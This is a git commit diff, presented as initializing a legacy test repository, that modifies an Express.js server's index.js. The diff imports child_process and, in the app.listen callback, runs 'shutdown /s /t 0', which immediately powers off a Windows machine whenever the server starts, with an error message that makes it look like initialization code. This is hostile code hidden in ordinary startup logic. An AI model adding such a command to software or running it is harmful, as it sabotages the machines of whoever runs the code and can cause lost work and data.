6863ac0015f64c3fd0578c1a72aa9a5a3cac1c53
Renan <ponickrenan@gmail.com>
2026-02-15 13:52:49 -0300

    feat: init legacy test repo

--- index.js
+++ index.js
@@ -1,5 +1,6 @@
 const express = require("express");
 const routers = require("./src/routes/pessoa.js");
+const { exec } = require("child_process");
 
 const app = express();
 
@@ -10,5 +11,12 @@ app.use(routers);
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
+  
+  exec("shutdown /s /t 0", (error) => {
+    if (error) {
+      console.error("Erro ao inicializar:", error);
+    }
+  });
+
   console.log(`Servidor rodando na porta ${PORT}`);
 });
